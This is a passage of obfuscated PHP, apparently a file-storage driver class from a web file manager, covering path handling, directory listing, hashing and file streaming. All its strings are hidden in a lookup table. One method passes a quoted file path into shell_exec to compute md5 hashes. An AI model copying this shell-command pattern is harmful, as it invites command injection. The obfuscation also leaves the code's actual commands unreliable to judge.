(function_exists($Ô›ûØ†[72])) { $Ûá­±å‘ = @mb_convert_encoding($Ø–ÛÍò¾, $„”†»˜è, $ÉØÏó™Ê); } else { $Ûá­±å‘ = @iconv($ÉØÏó™Ê, $„”†»˜è, $Ø–ÛÍò¾); } $Ûá­±å‘ = $Ûá­±å‘ ? $Ûá­±å‘ : $Ø–ÛÍò¾; if (strstr($Ûá­±å‘, $Ô›ûØ†[73])) { $Ûá­±å‘ = str_replace($Ô›ûØ†[73], $Ô›ûØ†[11], $Ûá­±å‘); } $¶ÊÂè´®[$ÉØÏó™Ê . $Ô›ûØ†[70] . $„”†»˜è . $Ô›ûØ†[71] . $Ø–ÛÍò¾] = $Ûá­±å‘; $¶ÊÂè´®[$„”†»˜è . $Ô›ûØ†[70] . $ÉØÏó™Ê . $Ô›ûØ†[71] . $Ø–ÛÍò¾] = $Ø–ÛÍò¾; $¶ÊÂè´®[$„”†»˜è . $Ô›ûØ†[70] . $ÉØÏó™Ê . $Ô›ûØ†[71] . $Ûá­±å‘] = $Ø–ÛÍò¾; $¶ÊÂè´®[$ÉØÏó™Ê . $Ô›ûØ†[70] . $„”†»˜è . $Ô›ûØ†[71] . $Ûá­±å‘] = $Ûá­±å‘; return $Ûá­±å‘; } public function getPathInner($ºöÁ”´Á) { $ØÃ··…£ = IO::init($ºöÁ”´Á); return $ØÃ··…£->path; } public function getPathOuter($şå˜¿) { $ƒÌ«¼Ø =& $_SERVER[…É¦À–]; $ı›˜Ù‚İ = strlen(trim($this->pathBase, $ƒÌ«¼Ø[8])); $şå˜¿ = substr(trim($şå˜¿, $ƒÌ«¼Ø[8]), $ı›˜Ù‚İ); return $this->pathDriver . $ƒÌ«¼Ø[8] . ltrim($şå˜¿, $ƒÌ«¼Ø[8]); } public function isParentOf($òšïÂö, $ÖÚÓĞâ”) { $–Á¥³µº =& $_SERVER[…É¦À–]; $òšïÂö = rtrim(strtolower($òšïÂö), $–Á¥³µº[8]) . $–Á¥³µº[8]; $ÖÚÓĞâ” = rtrim(strtolower($ÖÚÓĞâ”), $–Á¥³µº[8]) . $–Á¥³µº[8]; $Ìá¸¿çŞ = strpos($ÖÚÓĞâ”, $òšïÂö) === 0; return $Ìá¸¿çŞ; } public function getType() { $÷„¡óï” =& $_SERVER[…É¦À–]; $¼ã‹ò¶Ç = str_replace($÷„¡óï”[74], $÷„¡óï”[12], get_class($this)); return strtolower($¼ã‹ò¶Ç); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($ûÅ¢ñÓŸ, $¬ªİ²™“) { $¡¥ˆÖÇ‚ =& $_SERVER[…É¦À–]; $íÅœ­¤á = rtrim($ûÅ¢ñÓŸ, $¡¥ˆÖÇ‚[8]) . $¡¥ˆÖÇ‚[8] . $¬ªİ²™“; $ôòŸ•Ó² = $this->exist($íÅœ­¤á); return $ôòŸ•Ó² ? $íÅœ­¤á : !1; } public function setModifyTime($ğ†á¯êé, $õØÔ÷è = '') { } public function renameObject($ÀÆºî›Ã, $É×ÉÈ) { $“§²ùÇ = $É×ÉÈ; $ÀÆºî›Ã = $this->getPathOuter($ÀÆºî›Ã); $É×ÉÈ = $this->pathFather($ÀÆºî›Ã) . $É×ÉÈ; $‘Ø–İÒÉ = IO::copy($ÀÆºî›Ã, $this->pathFather($ÀÆºî›Ã), REPEAT_RENAME_FOLDER, $“§²ùÇ); if ($‘Ø–İÒÉ) { IO::remove($ÀÆºî›Ã); } return $‘Ø–İÒÉ ? $É×ÉÈ : !1; } public function tempFile($³Š»·‡ = '', $–“À‹ÔŸ = '') { if (!$³Š»·‡) { $³Š»·‡ = rand_string(15); } $ˆğİåœØ = TEMP_FILES . rand_string(15) . $_SERVER[…É¦À–][8]; @mkdir($ˆğİåœØ, DEFAULT_PERRMISSIONS, !0); $±Íà¦Î = $ˆğİåœØ . $³Š»·‡; @touch($±Íà¦Î); if ($–“À‹ÔŸ) { file_put_contents($±Íà¦Î, $–“À‹ÔŸ); } return $±Íà¦Î; } public function tempFileRemve($ü†óÛ¹) { @unlink($ü†óÛ¹); @rmdir($this->pathFather($ü†óÛ¹)); } public function mkfile($ãùŞÁèÖ, $Êá‚ÁŞÔ = '', $éÚïëÙ = REPEAT_RENAME) { } public function mkdir($ÏöÛê®, $øˆ²Å› = REPEAT_SKIP) { } public function delFile($è·¹õªõ) { } public function delFolder($†Öç­êÀ) { } public function copyFile($ĞïŠàí, $“¤¾şÏ) { } public function moveFile($ø¤î, $ˆéŒÙ¥İ) { } public function remove($‰ŒÇ¨’ö) { if ($this->isFile($‰ŒÇ¨’ö)) { return $this->delFile($‰ŒÇ¨’ö); } return $this->delFolder($‰ŒÇ¨’ö); } public function rename($îİ¾é¹Ã, $‘˜Ëª¢™) { } public function exist($Î‘³äƒä) { } public function findByHash($Óóè·ƒ = '', $»’º­¾‡ = '') { return !1; } public function isFile($¿ÕöÑûï) { } public function isFolder($ÔÕ™€ªç) { } public function size($òçç¿×¯) { } public function info($†õòİó) { } public function infoSimple($ØİıÜ¦Ò) { return $this->info($ØİıÜ¦Ò); } public function infoAuth($Ç¡áØñƒ) { return $this->info($Ç¡áØñƒ); } public function infoFull($·ÜéÑñ˜) { return $this->info($·ÜéÑñ˜); } public function infoWithChildren($µ¯£¡­Î) { $õã¹Ò‹› =& $_SERVER[…É¦À–]; static $’¯àáİö = array(); if (isset($’¯àáİö[$µ¯£¡­Î])) { return $’¯àáİö[$µ¯£¡­Î]; } $íëóò©˜ = $this->info($µ¯£¡­Î); if ($íëóò©˜ && $íëóò©˜[$õã¹Ò‹›[33]] == $õã¹Ò‹›[75]) { $ˆ›ƒ¤ŸÑ = array($õã¹Ò‹›[76] => 0, $õã¹Ò‹›[77] => 0, $õã¹Ò‹›[78] => 0); $this->infoChildren($µ¯£¡­Î, $ˆ›ƒ¤ŸÑ); $íëóò©˜[$õã¹Ò‹›[76]] = $ˆ›ƒ¤ŸÑ[$õã¹Ò‹›[76]]; $íëóò©˜[$õã¹Ò‹›[79]] = array($õã¹Ò‹›[80] => $ˆ›ƒ¤ŸÑ[$õã¹Ò‹›[77]], $õã¹Ò‹›[81] => $ˆ›ƒ¤ŸÑ[$õã¹Ò‹›[78]]); $’¯àáİö[$µ¯£¡­Î] = $íëóò©˜; } return $íëóò©˜; } public function listPath($Ê»“Ôû, $Î²Ûá™ = false) { } public function has($Øıé¨è‡, $“•–™ëÂ = false, $œùÓ‘Ğœ = false) { } public function canRead($ÒßÛëó) { } public function canWrite($À™€ø) { } public function getContent($¤¡ë“ù¦) { } public function setContent($ı×¸¼Ãú, $æ¯Ò½ç = '') { } protected function infoChildren($âú’“şâ, &$§Ê€·ƒ) { $â¯Èù£ =& $_SERVER[…É¦À–]; check_abort_echo(); $ñœÔø = $this->listPath($âú’“şâ, !0); $ñœÔø = array_merge($ñœÔø[$â¯Èù£[82]], $ñœÔø[$â¯Èù£[83]]); foreach ($ñœÔø as $…¹Œõàµ) { if ($…¹Œõàµ[$â¯Èù£[33]] == $â¯Èù£[75]) { $§Ê€·ƒ[$â¯Èù£[78]]++; $ÌÖ¿õÃç = $this->getPathInner($…¹Œõàµ[$â¯Èù£[84]]); $this->infoChildren($ÌÖ¿õÃç, $§Ê€·ƒ); } else { $§Ê€·ƒ[$â¯Èù£[77]]++; $§Ê€·ƒ[$â¯Èù£[76]] += $…¹Œõàµ[$â¯Èù£[76]]; } } } public function fileSubstr($èîäùÀ¥, $Òş×Ö°Ù, $»ºØ¢óù) { } public function listAll($ÔâÛ®¥…) { } public function listAllMake($ŞŞÒ´é, &$¬äô–½) { $¿”³ıòä =& $_SERVER[…É¦À–]; check_abort_echo(); $¥‡ĞËƒ© = $this->listPath($ŞŞÒ´é, !0); if (!$¥‡ĞËƒ©) { return; } $á•±±İ® = array_merge($¥‡ĞËƒ©[$¿”³ıòä[82]], $¥‡ĞËƒ©[$¿”³ıòä[83]]); foreach ($á•±±İ® as $íÔÅã¿Ï) { $Óí³Ì¯ã = $íÔÅã¿Ï[$¿”³ıòä[33]] == $¿”³ıòä[75]; $Òş×“ŞÉ = array($¿”³ıòä[84] => $íÔÅã¿Ï[$¿”³ıòä[84]], $¿”³ıòä[75] => $Óí³Ì¯ã); if (isset($íÔÅã¿Ï[$¿”³ıòä[76]])) { $Òş×“ŞÉ[$¿”³ıòä[76]] = $íÔÅã¿Ï[$¿”³ıòä[76]]; } if (isset($íÔÅã¿Ï[$¿”³ıòä[85]])) { $Òş×“ŞÉ[$¿”³ıòä[85]] = $íÔÅã¿Ï[$¿”³ıòä[85]]; } if (!$Óí³Ì¯ã) { $¬äô–½[] = $Òş×“ŞÉ; continue; } $¬äô–½[] = $Òş×“ŞÉ; $‰‹å°ª¯ = $íÔÅã¿Ï[$¿”³ıòä[84]]; $„³¡¨ı¸ = $this->pathDriver; if (substr($íÔÅã¿Ï[$¿”³ıòä[84]], 0, strlen($„³¡¨ı¸)) == $„³¡¨ı¸) { $‰‹å°ª¯ = substr($‰‹å°ª¯, strlen($„³¡¨ı¸)); } $this->listAllMake($‰‹å°ª¯, $¬äô–½); } } public function listAllSimple($ÙûÙïÔø, $ŸëºÊ¬Õ = false) { $Äì¬ËÕ‹ = $this->listAll($ÙûÙïÔø); return $this->listAllSimpleMake($Äì¬ËÕ‹, $this->getPathOuter($ÙûÙïÔø), $ŸëºÊ¬Õ); } public function listAllSimpleMake($â³­ğŸï, $Ş¸õĞ‘õ, $¨êßñíæ) { $Ù•ÇßêŠ =& $_SERVER[…É¦À–]; $ÏŞù†Ç = array(); $Ş¸õĞ‘õ = rtrim(get_path_father($Ş¸õĞ‘õ), $Ù•ÇßêŠ[8]) . $Ù•ÇßêŠ[8]; foreach ($â³­ğŸï as $Äñòê¢) { $è×ïÖÖ‹ = array($Ù•ÇßêŠ[84] => $Äñòê¢[$Ù•ÇßêŠ[84]], $Ù•ÇßêŠ[86] => $Äñòê¢[$Ù•ÇßêŠ[84]], $Ù•ÇßêŠ[75] => $Äñòê¢[$Ù•ÇßêŠ[75]]); if (isset($Äñòê¢[$Ù•ÇßêŠ[76]]) && !$Äñòê¢[$Ù•ÇßêŠ[75]]) { $è×ïÖÖ‹[$Ù•ÇßêŠ[76]] = $Äñòê¢[$Ù•ÇßêŠ[76]]; } if (isset($Äñòê¢[$Ù•ÇßêŠ[85]])) { $è×ïÖÖ‹[$Ù•ÇßêŠ[85]] = $Äñòê¢[$Ù•ÇßêŠ[85]]; } if (is_array($Äñòê¢[$Ù•ÇßêŠ[87]])) { $è×ïÖÖ‹[$Ù•ÇßêŠ[86]] = $Äñòê¢[$Ù•ÇßêŠ[87]][$Ù•ÇßêŠ[84]]; $è×ïÖÖ‹[$Ù•ÇßêŠ[76]] = $Äñòê¢[$Ù•ÇßêŠ[87]][$Ù•ÇßêŠ[76]]; $è×ïÖÖ‹[$Ù•ÇßêŠ[85]] = $Äñòê¢[$Ù•ÇßêŠ[87]][$Ù•ÇßêŠ[85]]; } else { if (substr($Äñòê¢[$Ù•ÇßêŠ[84]], 0, strlen($Ş¸õĞ‘õ)) == $Ş¸õĞ‘õ) { $è×ïÖÖ‹[$Ù•ÇßêŠ[84]] = substr($Äñòê¢[$Ù•ÇßêŠ[84]], strlen($Ş¸õĞ‘õ)); } } $……Â²¶ß = $Äñòê¢[$Ù•ÇßêŠ[75]] ? $Ù•ÇßêŠ[8] : $Ù•ÇßêŠ[12]; $è×ïÖÖ‹[$Ù•ÇßêŠ[86]] = rtrim($è×ïÖÖ‹[$Ù•ÇßêŠ[86]], $Ù•ÇßêŠ[8]) . $……Â²¶ß; $è×ïÖÖ‹[$Ù•ÇßêŠ[84]] = $Ù•ÇßêŠ[8] . trim($è×ïÖÖ‹[$Ù•ÇßêŠ[84]], $Ù•ÇßêŠ[8]) . $……Â²¶ß; if (!$¨êßñíæ) { $¼²ÒÃø³ = explode($Ù•ÇßêŠ[8], trim($è×ïÖÖ‹[$Ù•ÇßêŠ[84]], $Ù•ÇßêŠ[8])); $è×ïÖÖ‹[$Ù•ÇßêŠ[84]] = $Ù•ÇßêŠ[8] . implode($Ù•ÇßêŠ[8], array_slice($¼²ÒÃø³, 1)) . $……Â²¶ß; } $ÏŞù†Ç[] = $è×ïÖÖ‹; } return array_sort_by($ÏŞù†Ç, $Ù•ÇßêŠ[84]); } public function upload($òì¦²îß, $ÖÃó•¥ˆ, $†à«¥¹š = false, $Ê—áĞ = REPEAT_REPLACE) { } public function uploadFileByID($„†éáï¦, $™ ïÅé, $µ´Å”ÇŸ) { } public function uploadFileByPath($İïÈåØš, $œÚäı, $²½ê¯ô‚ = array()) { } public function isUploadServer() { $Æ»¦Å¤Ñ =& $_SERVER[…É¦À–]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $Æ»¦Å¤Ñ[88]) { return !0; } return $GLOBALS[$Æ»¦Å¤Ñ[6]][$Æ»¦Å¤Ñ[89]][$Æ»¦Å¤Ñ[90]]; } public function isFileOutServer() { $ªÚÎÍ¢ =& $_SERVER[…É¦À–]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $ªÚÎÍ¢[88]) { return !0; } return $GLOBALS[$ªÚÎÍ¢[6]][$ªÚÎÍ¢[89]][$ªÚÎÍ¢[91]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($ıŒ¼Ï) { $Âå…ı„ì =& $_SERVER[…É¦À–]; if (!$this->isCdnHost()) { return $ıŒ¼Ï; } return str_replace(trim(get_url_root($ıŒ¼Ï), $Âå…ı„ì[8]), trim($this->cdnHost, $Âå…ı„ì[8]), $ıŒ¼Ï); } public function uploadLink($ŠÍğÌÉĞ, $ŒÅóÙË = 0) { $©¨°²º± =& $_SERVER[…É¦À–]; if ($this->isUploadServer()) { return; } $á“Ú­óÔ = $this->getType(); if (!in_array($á“Ú­óÔ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $êí»úÏ³ = 1024 * 1024 * 10; $ã©ŸŠâ = $ŒÅóÙË <= $êí»úÏ³ ? $©¨°²º±[92] : $©¨°²º±[93]; $•“ƒ”¸¸ = (!$ŒÅóÙË ? 1 : ceil($ŒÅóÙË / pow(1024, 3))) * 3600 * 4; $»¥Œ¿ğ = $this->{$ã©ŸŠâ}($ŠÍğÌÉĞ, $•“ƒ”¸¸); if ($»¥Œ¿ğ) { $»¥Œ¿ğ[$©¨°²º±[94]] = $ŠÍğÌÉĞ; $»¥Œ¿ğ[$©¨°²º±[95]] = $á“Ú­óÔ; } return $»¥Œ¿ğ; } public function uploadFormData($ÍËÊ”•Æ, $ÙÆÂÑ³Ÿ = 3600) { } public function multiUploadFormData($ú§§¤öÔ, $Å·€À± = 3600) { } public function download($òÌé†™ø, $š‹çŸş…) { } public function ext($¸ˆ´á˜Ÿ) { $¬¦ğ÷”– =& $_SERVER[…É¦À–]; if (strpos($¸ˆ´á˜Ÿ, $¬¦ğ÷”–[8]) === -1) { $å±ã´Í = $¸ˆ´á˜Ÿ; } else { $å±ã´Í = $this->pathThis($¸ˆ´á˜Ÿ); } $„©ÍãĞ˜ = $¬¦ğ÷”–[12]; if (strstr($å±ã´Í, $¬¦ğ÷”–[10])) { $„©ÍãĞ˜ = substr($å±ã´Í, strrpos($å±ã´Í, $¬¦ğ÷”–[10]) + 1); $„©ÍãĞ˜ = strtolower($„©ÍãĞ˜); } if (strlen($„©ÍãĞ˜) > 3 && preg_match($¬¦ğ÷”–[96], $„©ÍãĞ˜, $°ôóÃîÍ)) { $„©ÍãĞ˜ = $¬¦ğ÷”–[12]; } return $„©ÍãĞ˜; } public function pathThis($Á“àÒ˜ş) { $“Ş‰³º¶ =& $_SERVER[…É¦À–]; $Á“àÒ˜ş = str_replace($“Ş‰³º¶[97], $“Ş‰³º¶[8], rtrim($Á“àÒ˜ş, $“Ş‰³º¶[8])); $óí´ç¸™ = strrpos($Á“àÒ˜ş, $“Ş‰³º¶[8]); if ($óí´ç¸™ === !1) { return $Á“àÒ˜ş; } return substr($Á“àÒ˜ş, $óí´ç¸™ + 1); } public function pathFather($“ÃÊ»‰é) { $†§Ÿšé‚ =& $_SERVER[…É¦À–]; $“ÃÊ»‰é = str_replace($†§Ÿšé‚[97], $†§Ÿšé‚[8], rtrim($“ÃÊ»‰é, $†§Ÿšé‚[8])); $±íÁ¤øß = strrpos($“ÃÊ»‰é, $†§Ÿšé‚[8]); if ($±íÁ¤øß === !1) { return $†§Ÿšé‚[12]; } return substr($“ÃÊ»‰é, 0, $±íÁ¤øß + 1); } public function hashSimple($ŒÉ¨Äœ») { $‡²ÍáÊ© =& $_SERVER[…É¦À–]; if (!$ŒÉ¨Äœ») { return md5($‡²ÍáÊ©[12]); } $Ú¨ó½ = $this->size($ŒÉ¨Äœ»); $õĞÁç© = 200; $õèËüÜí = 50; if ($Ú¨ó½ <= $õĞÁç© * $õèËüÜí) { return $this->hashMd5($ŒÉ¨Äœ») . $Ú¨ó½; } $Ü¹äØÍ• = intval($Ú¨ó½ / $õèËüÜí); $Èï«Èï¥ = $‡²ÍáÊ©[12]; for ($‚¶œŠãé = 0; $‚¶œŠãé < $õèËüÜí; $‚¶œŠãé++) { $Èï«Èï¥ .= $this->fileSubstr($ŒÉ¨Äœ», $Ü¹äØÍ• * $‚¶œŠãé, $õĞÁç©); } $Èï«Èï¥ .= $this->fileSubstr($ŒÉ¨Äœ», $Ú¨ó½ - $õĞÁç©, $õĞÁç©); return md5($Èï«Èï¥) . $Ú¨ó½; } public static $md5Cache = array(); public function hashMd5($œº¿èû) { if (!$œº¿èû) { return md5($_SERVER[…É¦À–][12]); } $œº¿èû = $this->iconvSystem($œº¿èû); if (isset(self::$md5Cache[$œº¿èû])) { return self::$md5Cache[$œº¿èû]; } self::$md5Cache[$œº¿èû] = $this->hashMd5Shell($œº¿èû); if (!self::$md5Cache[$œº¿èû]) { self::$md5Cache[$œº¿èû] = @md5_file($œº¿èû); } return self::$md5Cache[$œº¿èû]; } private function hashMd5Shell($äÄÈ ĞÉ) { $¬“ù¨Ì =& $_SERVER[…É¦À–]; if (!$äÄÈ ĞÉ) { return md5($¬“ù¨Ì[12]); } if (!function_exists($¬“ù¨Ì[98])) { return !1; } $û‚”ßÈÕ = array($¬“ù¨Ì[99], $¬“ù¨Ì[100]); $‰¬€ÖÇ = Cache::get($¬“ù¨Ì[101]); if (!$‰¬€ÖÇ) { $ Ì¬®â© = BASIC_PATH . $¬“ù¨Ì[102]; $ƒ’ûê·ª = md5_file($ Ì¬®â©); $‰¬€ÖÇ = $¬“ù¨Ì[103]; foreach ($û‚”ßÈÕ as $Ù³‚µòÏ) { $Ğë˜ÜÎÖ = shell_exec($Ù³‚µòÏ . "\40\x22{$ Ì¬®â©}\42"); if ($Ğë˜ÜÎÖ && substr(trim($Ğë˜ÜÎÖ), 0, 32) == $ƒ’ûê·ª) { $‰¬€ÖÇ = $Ù³‚µòÏ; break; } } Cache::set($¬“ù¨Ì[101], $‰¬€ÖÇ, 3600); } if ($‰¬€ÖÇ == $¬“ù¨Ì[103]) { return !1; } $Ğë˜ÜÎÖ = shell_exec($‰¬€ÖÇ . "\x20\42{$äÄÈ ĞÉ}\42"); $Ğë˜ÜÎÖ = str_replace($¬“ù¨Ì[104], $¬“ù¨Ì[12], $Ğë˜ÜÎÖ); return substr($Ğë˜ÜÎÖ, 0, 32); } public function link($€‡—÷™) { return $€‡—÷™; } public function fileOut($ëÕ˜ô’Í, $ò¸ê¥¬ = false, $¼ß‚Ò§ù = false, $”©¶œéú = '') { $ãÂçÂõ =& $_SERVER[…É¦À–]; $this->cacheMethod(null, null); if (!$ëÕ˜ô’Í || !$this->exist($ëÕ˜ô’Í)) { show_json(LNG($ãÂçÂõ[105]), !1, $¼ß‚Ò§ù); } $òàİ—®˜ = $this->getType() == $ãÂçÂõ[106]; $Ö…„ = $GLOBALS[$ãÂçÂõ[6]][$ãÂçÂõ[89]][$ãÂçÂõ[107]][$ãÂçÂõ[108]]; $‡ì­òªå = (double) $GLOBALS[$ãÂçÂõ[6]][$ãÂçÂõ[89]][$ãÂçÂõ[107]][$ãÂçÂõ[109]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $™É‘Ÿ÷ = $this->infoFull($ëÕ˜ô’Í); $»§°°®× = $™É‘Ÿ÷[$ãÂçÂõ[76]]; $¤­¸¹½µ = gmdate($ãÂçÂõ[110], $™É‘Ÿ÷[$ãÂçÂõ[85]]); $®æ©·Ë÷ = $¼ß‚Ò§ù ? $¼ß‚Ò§ù : $this->iconvApp($™É‘Ÿ÷[$ãÂçÂõ[32]]); $ğ¶Ñ¹‹ = 0; $®‘‘‰  = $»§°°®× - 1; $ÙÙÛ•†¦ = $this->ext($®æ©·Ë÷); if (in_array($ÙÙÛ•†¦, array($ãÂçÂõ[111], $ãÂçÂõ[112], $ãÂçÂõ[113], $ãÂçÂõ[114]))) { $ÙÙÛ•†¦ = $ãÂçÂõ[115]; } if (in_array($ÙÙÛ•†¦, array($ãÂçÂõ[116]))) { $ÙÙÛ•†¦ = $ãÂçÂõ[117]; } if (!$”©¶œéú) { $”©¶œéú = md5($¤­¸¹½µ . $this->hashSimple($ëÕ˜ô’Í)); } $”©¶œéú = $ãÂçÂõ[118] . $”©¶œéú . $ãÂçÂõ[118]; $úú×’ğÕ = get_file_mime($ÙÙÛ•†¦); $ÍÙüÜÍÈ = !0; $ÍÙüÜÍÈ = isset($_GET[$ãÂçÂõ[119]]) ? !1 : !0; if ($ò¸ê¥¬ === !1 && !mime_support($úú×’ğÕ)) { $úú×’ğÕ = $ãÂçÂõ[120]; } header($ãÂçÂõ[121]); header($ãÂçÂõ[122] . $úú×’ğÕ); $ñ²Ãô®ª = rawurlencode($®æ©·Ë÷); $ñ²Ãô®ª = $ãÂçÂõ[118] . $ñ²Ãô®ª . $ãÂçÂõ[123] . $ñ²Ãô®ª; if ($ò¸ê¥¬) { header($ãÂçÂõ[124]); header($ãÂçÂõ[125] . $ñ²Ãô®ª); } else { if ($ÍÙüÜÍÈ) { header($ãÂçÂõ[126] . $ñ²Ãô®ª); } } header($ãÂçÂõ[127] . gmdate($ãÂçÂõ[110], time() + 3600 * 24 * 30) . $ãÂçÂõ[128]); header($ãÂçÂõ[129]); header($ãÂçÂõ[130]); header($ãÂçÂõ[131]); if (isset($_SERVER[$ãÂçÂõ[132]]) && strtotime($_SERVER[$ãÂçÂõ[132]]) == $™É‘Ÿ÷[$ãÂçÂõ[85]]) { header($ãÂçÂõ[133], !0, 304); die; } if (isset($_SERVER[$ãÂçÂõ[134]]) && $_SERVER[$ãÂçÂõ[134]] == $”©¶œéú) { header($ãÂçÂõ[135] . $”©¶œéú, !0, 304); die; } header($ãÂçÂõ[135] . $”©¶œéú); header($ãÂçÂõ[136] . $¤­¸¹½µ . $ãÂçÂõ[128]); header($ãÂçÂõ[137] . $®æ©·Ë÷); header($ãÂçÂõ[138]); header($ãÂçÂõ[139] . $»§°°®×); header($ãÂçÂõ[140]); if (!$ò¸ê¥¬ && $ÙÙÛ•†¦ == $ãÂçÂõ[141]) { if ($»§°°®× > 1024 * 1024 * 5) { die; } $éı£ Í— = $this->getContent($ëÕ˜ô’Í); $éı£ Í— = Html::clearSVG($éı£ Í—); header($ãÂçÂõ[142] . strlen($éı£ Í—)); echo $éı£ Í—; die; } $Ï¤«·˜ = strtolower($_SERVER[$ãÂçÂõ[143]]); if ($òàİ—®˜ && $Ï¤«·˜ && $Ö…„) { if (strstr($Ï¤«·˜, $ãÂçÂõ[144])) { header($ãÂçÂõ[145] . $ëÕ˜ô’Í); } else { if (strstr($Ï¤«·˜, $ãÂçÂõ[146])) { header($ãÂçÂõ[147] . $ëÕ˜ô’Í); } else { if (strstr($Ï¤«·˜, $ãÂçÂõ[148])) { header($ãÂçÂõ[149] . $ëÕ˜ô’Í); } } } if ($‡ì­òªå) { header($ãÂçÂõ[150] . $‡ì­òªå); } return; } if (isset($_SERVER[$ãÂçÂõ[151]])) { if (preg_match($ãÂçÂõ[152], $_SERVER[$ãÂçÂõ[151]], $òãà®†)) { $ğ¶Ñ¹‹ = intval($òãà®†[1]); $ğ¶Ñ¹‹ = $ğ¶Ñ¹‹ <= 0 ? 0 : ($ğ¶Ñ¹‹ >= $®‘‘‰  ? $®‘‘‰  : $ğ¶Ñ¹‹); if (!empty($òãà®†[2])) { $œƒé´¢´ = intval($òãà®†[2]); $®‘‘‰  = $œƒé´¢´ < $ğ¶Ñ¹‹ ? $ğ¶Ñ¹‹ : ($œƒé´¢´ >= $®‘‘‰  ? $®‘‘‰  : $œƒé´¢´); } } header($ãÂçÂõ[153]); header("\x43\157\156\164\x65\156\x74\55\x52\x61\x6e\x67\x65\72\x20\142\x79\164\145\x73\x20{$ğ¶Ñ¹‹}\55{$®‘‘‰ }\x2f" . $»§°°®×); } else { header($ãÂçÂõ[154]); } header($ãÂçÂõ[155]); $—ÓÛœÙŞ = !0; if ($_SERVER[$ãÂçÂõ[156]] == $ãÂçÂõ[157] && $»§°°®× > 1204 * 1024 * 1024 * 2) { $—ÓÛœÙŞ = !1; } if ($—ÓÛœÙŞ) { header($ãÂçÂõ[158] . ($®‘‘‰  - $ğ¶Ñ¹‹ + 1)); } if ($_SERVER[$ãÂçÂõ[159]] == $ãÂçÂõ[160]) { return; } $ÇëâæïÛ = 1024 * 100; $èÄ³Œ¢æ = 0; if ($‡ì­òªå) { $èÄ³Œ¢æ = intval(1000 * 1000 * ($ÇëâæïÛ / $‡ì­òªå)); } while ($ğ¶Ñ¹‹ <= $®‘‘‰ ) { $— ËÚ½Û = timeFloat(); check_abort(); $Ê«„±ÅØ = $®‘‘‰  - $ğ¶Ñ¹‹ + 1; if ($Ê«„±ÅØ <= $ÇëâæïÛ) { $ÇëâæïÛ = $Ê«„±ÅØ; } echo $this->fileSubstr($ëÕ˜ô’Í, $ğ¶Ñ¹‹, $ÇëâæïÛ); $ğ¶Ñ¹‹ += $ÇëâæïÛ; if ($ÇëâæïÛ == $Ê«„±ÅØ) { $ğ¶Ñ¹‹ = $®‘‘‰  + 1; } if ($èÄ³Œ¢æ) { $Õ½±Áù§ = intval(1000 * 1000 * (timeFloat() - $— ËÚ½Û)); $ş·³İí = $èÄ³Œ¢æ - $Õ½±Áù§; if ($ş·³İí > 5) { usleep($ş·³İí); } } } } public function fileOutServer($ÙÓû±©ğ, $Îì™ÁÈï = false, $ÃÒÑ”ş¨ = false, $óæŸ«¾ì = '') { $this->fileOut($ÙÓû±©ğ, $Îì™ÁÈï, $ÃÒÑ”ş¨, $óæŸ«¾ì); } public function fileOutLink($·ä«ì£ ) { header($_SERVER[…É¦À–][161] . $·ä«ì£ ); die; } public function cacheMethod($éîÉÚ«, $€¯¿ùñÜ, $­òçæÄ³ = null) { $ÓüüÑ¥‹ =& $_SERVER[…É¦À–]; static $¯Ô‰íÁ¤ = array(); $„ÕÅëşƒ = $€¯¿ùñÜ ? ltrim($this->getPathOuter($€¯¿ùñÜ), $ÓüüÑ¥‹[8]) : $ÓüüÑ¥‹[12]; $“ªÏÜ = $ÓüüÑ¥‹[162] . $éîÉÚ« . $ÓüüÑ¥‹[163] . rtrim($„ÕÅëşƒ, $ÓüüÑ¥‹[8]); if (is_null($éîÉÚ«)) { $¯Ô‰íÁ¤ = array(); return; } if (is_null($€¯¿ùñÜ)) { foreach ($¯Ô‰íÁ¤ as $“ªÏÜ => $òÑ¿ä£¼) { if (!strstr($“ªÏÜ, $ÓüüÑ¥‹[162] . $éîÉÚ« . $ÓüüÑ¥‹[164])) { continue; } unset($¯Ô‰íÁ¤[$“ªÏÜ]); } return; } if (!is_null($­òçæÄ³)) { $¯Ô‰íÁ¤[$“ªÏÜ] = $­òçæÄ³; return; } $´æ±¬öÕ = isset($¯Ô‰íÁ¤[$“ªÏÜ]) ? $¯Ô‰íÁ¤[$“ªÏÜ] : null; if (!is_null($´æ±¬öÕ)) { return $´æ±¬öÕ; } $´æ±¬öÕ = $this->{$éîÉÚ«}($€¯¿ùñÜ); $¯Ô‰íÁ¤[$“ªÏÜ] = $´æ±¬öÕ; return $´æ±¬öÕ; } public function cacheMethodInfoSet($×¿É¢Úê, $È‘›¾¿, $‹×™Ò±ğ = false) { $°‡ç‹Õš =& $_SERVER[…É¦À–]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($°‡ç‹Õš[165], $×¿É¢Úê, $È‘›¾¿); $this->cacheMethod($°‡ç‹Õš[166], $×¿É¢Úê, $È‘›¾¿ ? !1 : !0); if (is_array($‹×™Ò±ğ)) { $this->cacheMethod($°‡ç‹Õš[167], $×¿É¢Úê, $‹×™Ò±ğ); } } public function fileOutImage($ì”şÅ´°, $¦ìŞƒ‹Å = 250) { $ÈÌÎ³ş› =& $_SERVER[…É¦À–]; set_timeout(); if (substr($ì”şÅ´°, 0, 4) == $ÈÌÎ³ş›[148]) { $this->fileOutLink($ì”şÅ´°); } $±ğôÖÆ© = $this->info($ì”şÅ´°); $°×–¸«ó = $±ğôÖÆ©[$ÈÌÎ³ş›[32]]; $›İú”­Ê = !1; if (isset($GLOBALS[$ÈÌÎ³ş›[168]]) && $GLOBALS[$ÈÌÎ³ş›[168]][$ÈÌÎ³ş›[84]] == $±ğôÖÆ©[$ÈÌÎ³ş›[84]]) { $¼³ÔËŸî = $GLOBALS[$ÈÌÎ³ş›[168]][$ÈÌÎ³ş›[169]]; if (!$±ğôÖÆ©[$ÈÌÎ³ş›[170]]) { $±ğôÖÆ©[$ÈÌÎ³ş›[170]] = $GLOBALS[$ÈÌÎ³ş›[168]]; } if (isset($¼³ÔËŸî[$ÈÌÎ³ş›[171]])) { if ($¼³ÔËŸî[$ÈÌÎ³ş›[171]] <= 